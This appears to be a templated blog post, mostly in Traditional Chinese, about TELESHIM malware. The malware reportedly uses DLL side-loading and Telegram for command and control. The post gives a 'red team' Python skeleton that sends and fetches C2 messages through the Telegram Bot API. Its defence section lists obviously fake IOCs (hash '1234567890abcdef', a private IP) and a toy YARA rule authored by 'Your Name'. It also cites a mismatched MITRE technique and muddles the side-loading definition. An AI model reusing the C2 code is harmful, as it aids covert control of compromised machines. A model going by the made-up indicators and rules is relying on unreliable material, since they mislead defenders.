---
layout: post
title:  "TELESHIM Abuses Telegram for C2 in Attacks Against Middle East Governments"
date:   2026-07-27 09:36:34 +0000
categories: [security]
severity: high
---

# 🔥 解析 TELESHIM 惡意軟體的技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Code Obfuscation, Telegram API Abuse, DLL Side-Loading

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: TELESHIM 惡意軟體利用 Telegram API 進行 C2 通信，同時使用 DLL Side-Loading 技術來執行惡意程式碼。
* **攻擊流程圖解**:
  1. User downloads an ISO file containing a legitimate executable ("RegSchdTask.exe")
  2. "RegSchdTask.exe" sideloads a rogue DLL ("AsTaskSched.dll")
  3. "AsTaskSched.dll" (TELESHIM) leverages Telegram API for C2 communication
  4. TELESHIM retrieves next-stage components and executes them
* **受影響元件**: Windows 32-bit and 64-bit systems

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: Victim must have Telegram installed and configured
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # Telegram API endpoint
    url = "https://api.telegram.org/bot<bot_token>/"
    
    # Send a message to the C2 server
    def send_message(message):
        params = {"chat_id": "<chat_id>", "text": message}
        response = requests.post(url + "sendMessage", params=params)
        return response.json()
    
    # Receive a message from the C2 server
    def receive_message():
        params = {"chat_id": "<chat_id>"}
        response = requests.post(url + "getUpdates", params=params)
        return response.json()
    
    ```
* **繞過技術**: TELESHIM 使用 code obfuscation 技術，包括 string encryption, control flow flattening (CFF), mixed boolean arithmetic (MBA), and opaque predicates

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | cert.hypersnet[.]com | C:\Windows\Temp\AsTaskSched.dll |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule TELESHIM_Detection {
      meta:
        description = "Detects TELESHIM malware"
        author = "Your Name"
      strings:
        $a = "AsTaskSched.dll"
        $b = "Telegram API"
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: Block Telegram API traffic, monitor for suspicious DLL loading, and implement EDR solutions to detect and prevent code obfuscation techniques

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **Code Obfuscation (程式碼混淆)**: 一種技術，用於使程式碼難以被理解和逆向工程。它可以使用各種方法，例如 string encryption, control flow flattening (CFF), mixed boolean arithmetic (MBA), and opaque predicates。
* **DLL Side-Loading (DLL 側載)**: 一種技術，用於在 Windows 系統上執行惡意程式碼。它涉及將一個惡意 DLL 檔案與一個合法的 DLL 檔案一起載入，然後執行惡意程式碼。
* **Telegram API Abuse (Telegram API濫用)**: 一種技術，用於利用 Telegram API 進行 C2 通信。它涉及使用 Telegram API 發送和接收消息，以控制受感染的系統。

## 5. 🔗 參考文獻與延伸閱讀

* [原始報告](https://thehackernews.com/2026/07/teleshim-abuses-telegram-for-c2-in.html)
* [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


